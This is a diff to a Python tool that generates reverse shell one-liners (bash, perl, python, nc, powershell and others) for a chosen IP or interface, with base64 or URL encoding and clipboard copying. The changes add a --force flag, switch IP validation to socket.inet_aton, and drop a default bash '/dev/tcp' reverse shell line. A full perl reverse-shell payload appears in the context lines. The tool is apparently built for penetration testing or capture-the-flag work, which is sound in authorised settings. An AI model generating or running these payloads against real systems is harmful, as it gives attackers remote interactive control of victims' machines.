@@ -17,10 +17,11 @@ import urllib.parse
 import base64
 
 import netifaces as ni
-import re
-import sys
+import socket
 
 import pyperclip
+
+import sys
 
 # Coloring the help
 help_supported_shell_types = colored('=== Supported reverse shell types ===','blue')
@@ -53,20 +54,20 @@ parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help=
 parser.add_argument('-s', '--shell', type=str, metavar = '', default = "/bin/sh", help='Which shell you want to use (e.g. /bin/bash, /bin/sh, etc.)')
 parser.add_argument('-t', '--rev-type', type=str, metavar = '', default = "bash", help='The kind of reverse shell you would like (e.g. perl, python, nc, etc.)')
 parser.add_argument('-e', '--encode', type=str, metavar = '', help='Specify encoding for the shell.')
-parser.add_argument('-r', '--raw', action = 'store_true', help='Prints out shell without a newline.\n')
 parser.add_argument('-c', '--clipboard', action = 'store_true', help='Copies into clipboard.\n')
+parser.add_argument('-f', '--force', action = 'store_true', help='Forces tool to accept argument.\n')
 
 args = parser.parse_args()
 
 class shells():
-    def __init__(self,ip,port,rev_type,encode):
+    def __init__(self,ip,port,rev_type,encode,force):
         self.ip = ip
         self.port = port
         self.rev_type = rev_type
         self.shell = shell
         self.encode = encode
     
-    def encoding(reverse,encode):        
+    def encoding(self,reverse,encode):        
         encode = encode.lower()
         encoding_types = ['base64','b64','url','url-all']
         if encode not in encoding_types:
@@ -87,25 +88,34 @@ class shells():
         global shell
         global port
         global ip
-        
-        # Checking if user inputted ip or interface
-        if bool(re.match(str(ip), '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'))==False: # True when user enters interface
-             
-            interfaces = ['eth0','eth1','wlan0','ppp0','lo','vboxnet0','pan0','vmnet1','vmnet8','tun0']
+        try:
+            socket.inet_aton(ip)
+        except:
             ip = str(ip)
-            #if(ip.lower() in interfaces):
             try:
+
+                # Converts localhost to lo
+                if ip.lower() == 'localhost':
+                    ip = 'lo'
                 ip = ni.ifaddresses(ip)[ni.AF_INET][0]['addr']
+
             except ValueError:
-                if(ip.lower() == "tun0"):
-                    cprint("tun0 was not found! Defaulting to eth0.\n","red")
-                    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-                else:
-                    cprint("Specified interface was not found, or no ip specified. Defaulting to eth0.\n","red")
-                    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+                
+                if not force:
+
+                    # Special message for tun0 as this tool will be used a lot in VPNs
+                    if(ip.lower() == "tun0"):
+                        cprint("tun0 was not found! Defaulting to eth0. Use --force to override.\n","red")
+                        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+                    else:
+                        cprint("Specified interface was not found, ip is invalid, or no ip specified. Defaulting to eth0. Use --force to override.\n","red")
+                        ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            
+            # If for some reason there is still an exception
             except Exception as e:
                 print(e)
                 sys.exit("Please specify an ip address or interface.")
+        
         # Coloring messes up output unless initialized with coloram.
         # Couldn't find a way to make it work with encoding
         if not encode and not clipboard:
@@ -113,17 +123,13 @@ class shells():
             shell = colored(shell, 'red')
             port = colored(port, 'red')
             ip = colored(ip, 'red')
-
-        # Default reverse shell
-        if not rev_type: 
-            reverse = """bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'""".format(ip,port)
-        
+         
         if rev_type:
+            
             rev_type = rev_type.lower()
             rev_types = ['bash','perl','python','python3','php','nc','netcat','ruby','powershell','ps']
-            
+
             if rev_type in rev_types:
-            
                 if(rev_type == "perl"):
                     reverse = """perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{} -i");}};'""".format(ip, port, shell)
                 elif(rev_type == "bash"):
@@ -152,7 +158,7 @@ class shells():
         
         # If user wants to encode the shell
         if encode:
-            reverse = shells.encoding(reverse,encode)
+            reverse = shells.encoding(self,reverse,encode)
             return reverse 
         else:     
             return reverse
@@ -164,17 +170,15 @@ if __name__ == '__main__':
     shell = args.shell
     rev_type = args.rev_type
     encode = args.encode
-    raw = args.raw
     clipboard = args.clipboard
+    force = args.force
     
-    arguments = shells(ip,port,rev_type,encode)
+    arguments = shells(ip,port,rev_type,encode,force)
 
 if clipboard:
     pyperclip.copy(arguments.reverse_shell())
     sys.exit(cprint("The reverse shell has been copied to your system clipboard.","green"))
-if len(sys.argv) > 1 and not raw:
+if len(sys.argv) > 1:
     sys.exit(arguments.reverse_shell())
-elif raw:
-    sys.exit(arguments.reverse_shell(), end="")
 else:
     parser.print_help()
